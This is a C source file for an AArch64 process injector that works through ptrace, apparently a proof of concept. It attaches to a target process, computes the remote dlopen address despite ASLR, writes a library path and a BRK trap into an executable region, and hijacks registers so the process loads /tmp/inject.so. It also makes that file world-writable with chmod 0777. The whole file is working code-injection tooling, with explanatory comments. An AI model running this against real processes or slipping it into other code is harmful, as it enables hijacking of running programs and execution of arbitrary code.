#define _GNU_SOURCE

#include "injector.h"

#include <elf.h>        // NT_PRSTATUS
#include <dlfcn.h>      // dlopen, dlsym
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/uio.h>    // struct iovec
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <asm/ptrace.h> // struct user_pt_regs (AArch64)

#include "../utils/helpers.h"

#define SO_PATH "/tmp/inject.so"

/*
 *  /proc/<pid>/maps helpers
 */


/*
 *  Find base address of a mapping whose line contains `library` substring.
 */
unsigned long long findLibrary(const char *library, pid_t pid) {
    char mapFilename[128];
    char buffer[4096];
    FILE *fd;
    unsigned long long addr = 0;

    if (pid == -1) {
        snprintf(mapFilename, sizeof(mapFilename), "/proc/self/maps");
    } else {
        snprintf(mapFilename, sizeof(mapFilename), "/proc/%d/maps", pid);
    }

    fd = fopen(mapFilename, "r");
    if (!fd) {
        return 0;
    }

    while (fgets(buffer, sizeof(buffer), fd)) {
        if (strstr(buffer, library)) {
            addr = strtoull(buffer, NULL, 16);
            break;
        }
    }

    fclose(fd);
    return addr;
}

/*
 *  Check if lib_name is dynamically linked by a process.
 */
int has_mapping(pid_t pid, const char *lib_name) {
    char path[64];
    char line[512];
    FILE *fileP;

    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    fileP = fopen(path, "r");
    if (!fileP) return 0;

    int found = 0;
    while (fgets(line, sizeof(line), fileP)) {
        if (strstr(line, lib_name)) {
            found = 1;
            break;
        }
    }
    fclose(fileP);
    return found;
}

int is_dynamic_process(pid_t pid) {
    /*
     *  Currently this inject strategy requires dlopen to exist in remote process's
     *  memory. has_mapping() checks if a library is dynamically linked by a process.
     *
     *  So we take our check both of the requirements, is dlopen dynamically linked?
     *  if so, then this process is dynamically linked
     *  if not, this process isn't dynamically linked and doesn't have dlopen
     *  as a dynamically linked lib, therefore this injection won't work and we return 0
     */
    if (has_mapping(pid, "ld-linux") || has_mapping(pid, "/ld-")) {
        return 1;
    }
    return 0;
}

/*
 *  Find an executable region in target (to reuse as scratch)
 *
 *  To inject our shared library we need to get the cpu to run our SO_PATH exec.
 *  To be able to do this, we need to search for a region in target
 *  process memory that is executable.
 *
 */
void *freeSpaceAddr(pid_t pid) {
    FILE *fp;
    char filename[64];
    char line[850];
    unsigned long addr = 0, end = 0;
    char perms[8];

    snprintf(filename, sizeof(filename), "/proc/%d/maps", pid);
    if ((fp = fopen(filename, "r")) == NULL) {
        fprintf(stderr, "[!] Error: could not open maps file for PID %d\n", pid);
        exit(1);
    }

    while (fgets(line, sizeof(line), fp)) {
        // Format: start-end perms ...
        if (sscanf(line, "%lx-%lx %7s", &addr, &end, perms) >= 2) {
            if (strchr(perms, 'x') != NULL) {
                // first executable region
                break;
            }
        }
    }

    fclose(fp);
    return (void *)addr;
}

/*
 *  ptrace memory helpers (read/write arbitrary bytes)
 */

void ptraceRead(pid_t pid, unsigned long long addr, void *data, int len) {
    long word;
    int i;
    char *p = (char *)data;

    for (i = 0; i < len; i += sizeof(word)) {
        errno = 0;
        word = ptrace(PTRACE_PEEKTEXT, pid, (void *)(addr + i), NULL);
        if (word == -1 && errno != 0) {
            perror("[!] Error reading process memory");
            exit(1);
        }
        int chunk = (len - i >= (int)sizeof(word)) ? (int)sizeof(word) : (len - i);
        memcpy(p + i, &word, chunk);
    }
}

void ptraceWrite(pid_t pid, unsigned long long addr, const void *data, int len) {
    long word;
    int i;

    for (i = 0; i < len; i += sizeof(word)) {
        memset(&word, 0, sizeof(word));
        int chunk = (len - i >= (int)sizeof(word)) ? (int)sizeof(word) : (len - i);
        memcpy(&word, (const char *)data + i, chunk);
        if (ptrace(PTRACE_POKETEXT, pid, (void *)(addr + i),
                   (void *)word) == -1) {
            perror("[!] Error writing to process memory");
            exit(1);
        }
    }
}

/*
 *  AArch64 register access via PTRACE_GETREGSET / PTRACE_SETREGSET
 */


int get_regs(pid_t pid, struct user_pt_regs *regs) {
    struct iovec iov;
    iov.iov_base = regs;
    iov.iov_len  = sizeof(*regs);
    if (ptrace(PTRACE_GETREGSET, pid, (void *)NT_PRSTATUS, &iov) == -1) {
        perror("PTRACE_GETREGSET");
        return -1;
    }
    return 0;
}

int set_regs(pid_t pid, const struct user_pt_regs *regs) {
    struct iovec iov;
    iov.iov_base = (void *)regs;
    iov.iov_len  = sizeof(*regs);
    if (ptrace(PTRACE_SETREGSET, pid, (void *)NT_PRSTATUS, &iov) == -1) {
        perror("PTRACE_SETREGSET");
        return -1;
    }
    return 0;
}

typedef struct
{
    void * lib_handle;
    const char *lib_name;
    void *dlopen;
} dlopen_info;

int get_local_dlopen(dlopen_info * dlopen_struct)
{
    if (!dlopen_struct)
    {
        return -1;
    }

    void *local_lib_handle = NULL;
    void *local_dlopen = NULL;

    // 1. Prefer libc.so.6 (modern glibc: dlopen lives here)
    local_lib_handle = dlopen("libc.so.6", RTLD_LAZY);
    if (local_lib_handle) {
        local_dlopen = dlsym(local_lib_handle, "dlopen");
        if (local_dlopen) {

            dlopen_struct->lib_handle = local_lib_handle;
            dlopen_struct->dlopen = local_dlopen;
            dlopen_struct->lib_name = "libc.so.6";

            debug_print(stderr, "[V]: Loaded libc.so.6 successfully!\n");
            return 0;
        }
    }

    debug_print(stderr, "[?]: Failed to load libc.so.6, trying fallback (libdl.so.2)");

    local_lib_handle = dlopen("libdl.so.2", RTLD_LAZY);
    if (!local_lib_handle) {
        fprintf(stderr,
                "[X] Could not open libc.so.6 or libdl.so.2: %s\n",
                dlerror());
        return -1;
    }

    local_dlopen = dlsym(local_lib_handle, "dlopen");

    if (!local_dlopen) {
        fprintf(stderr, "[X] dlsym(\"dlopen\") failed: %s\n", dlerror());
        return -1;
    }

    dlopen_struct->lib_handle = local_lib_handle;
    dlopen_struct->dlopen = local_dlopen;
    dlopen_struct->lib_name = "libdl.so.2";

    debug_print(stderr, "[V]: Loaded libdl.so.2 successfully!");

    return 0;
}

/*
 *  Our goal -> Find the remote dlopen
 *  Why?     -> So we can use it to load our shared library!
 *
 *  Because of ASLR, this is tough but not impossible. The offset of dlopen
 *  in the libc library on our local process is the same as the remote's offset.
 *
 *  The plan:
 *  1. Locate our libc & dlopen addresses.
 *  2. Calculate the offset
 *  3. Locate remote process's libc using findLibrary
 *  4. The remote process's dlopen's address is now known
 *
 */
int resolve_remote_dlopen(const pid_t pid, void **remote_func_out) {
    if (!is_dynamic_process(pid)) {
        fprintf(stderr, "[X] Target %d appears to be static; no loader present.\n", pid);
        return -1;
    }

    dlopen_info * local_dlopen = (dlopen_info*) malloc(sizeof(dlopen_info));

    if (local_dlopen == NULL) {
        fprintf(stderr, "[X] Failed to allocate memory for dlopen_info!\n");
        return -1;
    }

    if (get_local_dlopen(local_dlopen) == -1) {
        fprintf(stderr, "[X] Failed to load local dlopen!\n");
        free(local_dlopen);

        return -1;
    }

    unsigned long long local_lib_base = findLibrary(local_dlopen->lib_name, -1);
    if (!local_lib_base) {
        fprintf(stderr, "[!] Could not find %s base in self.\n", local_dlopen->lib_name);
        free(local_dlopen);
        return -1;
    }

    printf("[*] local dlopen lib:   %s\n", local_dlopen->lib_name);
    printf("[*] local dlopen:       %p\n", local_dlopen->dlopen);
    printf("[*] local dlopen base:  0x%llx\n", local_lib_base);

    unsigned long long offset =
        (unsigned long long)(uintptr_t)local_dlopen->dlopen - local_lib_base;

    unsigned long long remote_lib_base = 0;

    if (strcmp(local_dlopen->lib_name, "libc.so.6") == 0) {
        remote_lib_base = findLibrary("libc.so.6", pid);
        if (!remote_lib_base) remote_lib_base = findLibrary("libc.so", pid);
        if (!remote_lib_base) remote_lib_base = findLibrary("libc-", pid);
    } else {
        remote_lib_base = findLibrary("libdl.so.2", pid);
        if (!remote_lib_base) remote_lib_base = findLibrary("libdl.so", pid);
        if (!remote_lib_base) remote_lib_base = findLibrary("libdl-", pid);
    }

    if (!remote_lib_base) {
        fprintf(stderr, "[!] Could not find matching %s in target process.\n",
                local_dlopen->lib_name);
        free(local_dlopen);
        return -1;
    }

    void *remote_dlopen = (void *)(remote_lib_base + offset);

    printf("[*] remote dlopen base: 0x%llx\n", remote_lib_base);
    printf("[*] remote dlopen addr: %p\n", remote_dlopen);

    *remote_func_out = remote_dlopen;

    free(local_dlopen);
    return 0;
}

/*
 *  Main injection logic for AArch64
 */

static int inject_so_into_process(pid_t pid) {
    struct user_pt_regs oldregs, regs;
    int status;
    unsigned char backup[64];
    void *remote_dlopen = NULL;

    if (resolve_remote_dlopen(pid, &remote_dlopen) == -1) {
        fprintf(stderr, "[!] Could not resolve remote dlopen.\n");
        return -1;
    }

    // Attach
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("PTRACE_ATTACH");
        return -1;
    }
    if (waitpid(pid, &status, WUNTRACED) == -1) {
        perror("waitpid attach");
        return -1;
    }

    // Save regs
    if (get_regs(pid, &oldregs) == -1) {
        return -1;
    }
    memcpy(&regs, &oldregs, sizeof(regs));

    // Choose executable region
    void* free_adr = freeSpaceAddr(pid);
    printf("[*] Using executable region at %p for scratch\n", free_adr);

    ptraceRead(pid, (unsigned long long)free_adr, backup, sizeof(backup));

    /*
     *
     *  We backed up 64 bytes sizeof(backup) at free_adr so we can
     *  write our SO_PATH to it. This is so we can tell the cpu later
     *  to load that file (our shared library into memory).
     *
     *  Layout:
     *  free_adr        <- SO_PATH string (<=48 bytes)
     *  free_adr + 48   <- BRK instruction
     *
     *  Technically, SO_PATH needs to be under 60 bytes
     *  (BRK thats inserted afterwards is 4 bytes) but were taking
     *  precaution. So 48 < 60 -> V.
     *  I'm not sure if 60 bytes is actually safe on all systems :/
     *
     */

    size_t path_len = strlen(SO_PATH) + 1;
    if (path_len > 48) {
        fprintf(stderr, "[!] so_path too long for this PoC (max 48 bytes)\n");
        return -1;
    }
    ptraceWrite(pid, (unsigned long long)free_adr, SO_PATH, (int)path_len);

    /*
     *  BRK Trap
     *
     *  Our goal:
     *  Load the shared libarary in to memory, then exit.
     *
     *  We have written the shared libarary exec (above) into memory.
     *  We need to make sure that once it finished executing, we unattach
     *  from the process. We accomplish this by adding a
     *  BRK instruction (breakpoint instruction), when the cpu executes it,
     *  it will send a SIGTRAP signal to the process.
     *  You guessed it.. We use ptrace to wait for a SIGTRAP signal and then
     *  we detach!
     */

    unsigned int brk_instruction_trap = 0xd4200000; // AArch64 BRK #0
    ptraceWrite(pid, (unsigned long long)free_adr + 48,
                &brk_instruction_trap, sizeof(brk_instruction_trap));

    /*
     *  AArch64 ABI (Application Binary Interface)
     *
     *  Actual shared library injection:
     *  Run the SO_PATH using the dlopen in the remote program's memory
     *  pc = dlopen address     <-- Next instruction to execute
     *  x0 = arg0 (SO_PATH)     <-- Shared libarary exec
     *  x1 = arg1 (mode = RTLD_LAZY = 2)    <-- Load shared library, resolve symbols when needed
     *  x30 = return address    <-- Will Jump to the brk_instruction_trap we added
     *
     *
     */

    regs.pc = (unsigned long long)remote_dlopen;

    regs.regs[0]  = (unsigned long long)free_adr;
    regs.regs[1]  = 2;
    regs.regs[30] = (unsigned long long)free_adr + 48;

    if (set_regs(pid, &regs) == -1) {
        return -1;
    }

    /*
     *  We can't load the shared library our selfs,
     *  What we can do is:
     *  1. stop the process
     *  2. inject "State" into its regs
     *  3. resume the process (this is what loads the shared library into memory)
     */

    if (ptrace(PTRACE_CONT, pid, NULL, NULL) == -1) {
        perror("PTRACE_CONT");
        return -1;
    }

    /*
     *  Wait for a signal (This will catch our SIGTRAP produced by our BRK instruction)
     */

    if (waitpid(pid, &status, WUNTRACED) == -1) {
        perror("waitpid after CONT");
        return -1;
    }

    /*
     *  Verification & restoring backedup registers:
     *
     *  WIFSTOPPED(status)  <-- Verify that process stopped
     *  WSTOPSIG(status)    <-- Which signal caused the stop
     *  SIGTRAP     <-- The signal we inserted using BRK
     */
    if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
        // dlopen return in x0
        if (get_regs(pid, &regs) == -1) {
            return -1;
        }

        /*
         *  dlopen's signature is:
         *      void *dlopen(const char *filename, int flag);
         *  Meaning that it needs to return a pointer if succeeded.
         *  So we check that pointer is valid (handle != 0)
         */
        unsigned long long dlopen_return_value = regs.regs[0];
        if (dlopen_return_value != 0) {
            printf("[*] Library injected successfully; handle = %p\n",
                   (void *)dlopen_return_value);
        } else {
            printf("[!] dlopen returned NULL; injection failed\n");
        }

        // Restore original code + regs, detach
        ptraceWrite(pid, (unsigned long long)free_adr, backup, sizeof(backup));
        if (set_regs(pid, &oldregs) == -1) {
            return -1;
        }
        if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
            perror("PTRACE_DETACH");
            return -1;
        }

        return 0;
    } else {
        fprintf(stderr, "[!] Unexpected stop (not SIGTRAP), status=0x%x\n", status);
        return -1;
    }

}

int inject(const pid_t pid) {
    printf("[*] AArch64 ptrace + dlopen-style injector\n");
    printf("[*] Target PID: %d, SO: %s\n", pid, SO_PATH);

    /*
     *  Since were using /tmp dir, the server process might not have access to it.
     */
    if (chmod(SO_PATH, 0777) == -1) {
        fprintf(stderr, "[Injector] Failed to change %s permissions. THIS PROCESS MUST RUN AS ROOT\n", SO_PATH);
        return -1;
    }
    
    if (inject_so_into_process(pid) != 0) {
        fprintf(stderr, "[Injector] Failed to inject shared library\n");
        return -1;
    }

    return 0;
}
